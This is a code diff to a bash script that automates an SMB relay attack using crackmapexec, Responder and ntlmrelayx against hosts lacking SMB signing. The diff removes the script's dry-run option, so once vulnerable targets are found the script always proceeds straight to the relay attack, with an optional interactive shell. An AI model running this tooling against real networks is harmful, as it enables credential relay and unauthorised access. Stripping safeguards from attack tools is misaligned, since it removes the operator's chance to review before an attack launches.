@@ -12,7 +12,6 @@ window1="responder"
 window2="ntlmrelayx"
 TARGET_SMB_FILE="vulnerable_smb_targets.txt" 
 enable_interactive=false
-dry_run=false
 
 # Define color codes
 RED='\033[0;31m'
@@ -28,11 +27,10 @@ network_interface="$(ip route | awk '/default/ {print $5; exit}')"
 # Print help
 print_help() {
     echo -e "${BLUE}Usage: $0 -f TARGET_FILE [-i NETWORK_INTERFACE] [-x] [-d] [-h]${RESET}"
-    echo -e "  ${YELLOW}-f TARGET_FILE${RESET}   (Required) File containing target IPs to scan for misconfigured SMB signing."
-    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${RESET} (Optional) Specify network interface (default: ${network_interface})."
-    echo -e "  ${YELLOW}-x${RESET}               (Optional) Enable interactive shell in ntlmrelayx."
-    echo -e "  ${YELLOW}-d${RESET}               (Optional) Dry-run mode. Scan and show results but do not launch attack."
-    echo -e "  ${YELLOW}-h${RESET}               Display this help and exit."
+    echo -e "  ${YELLOW}-f TARGET_FILE${RESET}         (Required) File containing target IPs to scan for misconfigured SMB signing."
+    echo -e "  ${YELLOW}-i NETWORK_INTERFACE${RESET}   (Optional) Specify network interface (default: ${network_interface})."
+    echo -e "  ${YELLOW}-x${RESET}                     (Optional) Enable interactive shell in ntlmrelayx."
+    echo -e "  ${YELLOW}-h${RESET}                     Display this help and exit."
 }
 
 # Banner function
@@ -162,7 +160,6 @@ while getopts "f:hi:xd" opt; do
     h) print_help; exit 0 ;;
     i) network_interface="$OPTARG";;
     x) enable_interactive=true ;;
-    d) dry_run=true ;;
     \?) 
         echo -e "${RED}[!] Invalid option: -$OPTARG${RESET}" >&2
         print_help
@@ -228,16 +225,11 @@ check_tool "crackmapexec"
 run_crackmapexec
 
 if [ -s "${TARGET_SMB_FILE}" ]; then
-    if [ "$dry_run" = true ]; then
-        echo -e "${YELLOW}[!] Dry-run mode: scan complete, attack skipped.${RESET}"
-        echo -e "${GREEN}[+] Vulnerable targets saved in ${TARGET_SMB_FILE}.${RESET}"
-        exit 0
-    else
-        edit_responder_conf
-        sleep 2
-        run_smb_relay_attack
-    fi
+    echo -e "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
+    edit_responder_conf
+    sleep 2
+    run_smb_relay_attack
 else
-    echo -e "${RED}[!] There are no misconfigured SMB signing targets found. Exiting...${RESET}"
-    exit 1
+    echo -e "${RED}[!] No misconfigured SMB signing targets found. Exiting...${RESET}"
+    exit 0
 fi
